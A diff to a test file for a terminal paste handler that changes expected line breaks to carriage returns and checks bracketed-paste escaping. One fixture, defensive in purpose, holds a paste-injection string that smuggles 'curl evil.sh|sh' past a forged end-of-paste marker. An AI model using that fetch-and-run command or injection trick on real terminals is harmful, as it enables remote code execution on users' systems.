@@ -60,7 +60,7 @@ describe('doPaste three-tier fallthrough', () => {
     mocks.readClipboardImageAsFilePath.mockResolvedValue(null);
     await doPaste('t1', 'first\nsecond');
     expect(mocks.writePty).toHaveBeenCalledExactlyOnceWith('t1',
-      bracketed ? '\x1b[200~first\nsecond\x1b[201~' : 'first\nsecond');
+      bracketed ? '\x1b[200~first\rsecond\x1b[201~' : 'first\rsecond');
     expect(mocks.readText).not.toHaveBeenCalled();
     expect(mocks.readClipboardFilePaths).not.toHaveBeenCalled();
     expect(mocks.readClipboardImageAsFilePath).not.toHaveBeenCalled();
@@ -153,7 +153,7 @@ describe('doPaste three-tier fallthrough', () => {
     // `\x1b[201~` is left in the payload and it is the one we wrote, at the end.
     const payload = mocks.writePty.mock.calls[0][1];
     expect(payload).toBe(
-      '\x1b[200~git status\u241b[201~\ncurl evil.sh|sh\n\x1b[201~',
+      '\x1b[200~git status\u241b[201~\rcurl evil.sh|sh\r\x1b[201~',
     );
     expect(payload.match(/\x1b\[201~/g)).toHaveLength(1);
     expect(payload.endsWith('\x1b[201~')).toBe(true);
@@ -227,13 +227,22 @@ describe('doPaste three-tier fallthrough', () => {
     expect(mocks.writePty).not.toHaveBeenCalled();
   });
 
-  it('leaves an unbracketed paste byte-for-byte, matching xterm', async () => {
+  it('leaves an unbracketed paste\'s escapes as they are, matching xterm', async () => {
     mocks.readClipboardFilePaths.mockResolvedValue(null);
     mocks.readText.mockResolvedValue('\x1b[31mred\x1b[0m');
 
     await doPaste('t1');
 
     expect(mocks.writePty).toHaveBeenCalledWith('t1', '\x1b[31mred\x1b[0m');
+  });
+
+  it('sends each line break as \\r, as xterm\'s own paste does', async () => {
+    mocks.readClipboardFilePaths.mockResolvedValue(null);
+    mocks.readText.mockResolvedValue('first\r\nsecond\nthird');
+
+    await doPaste('t1');
+
+    expect(mocks.writePty).toHaveBeenCalledWith('t1', 'first\rsecond\rthird');
   });
 
   it('swallows image adapter errors silently', async () => {
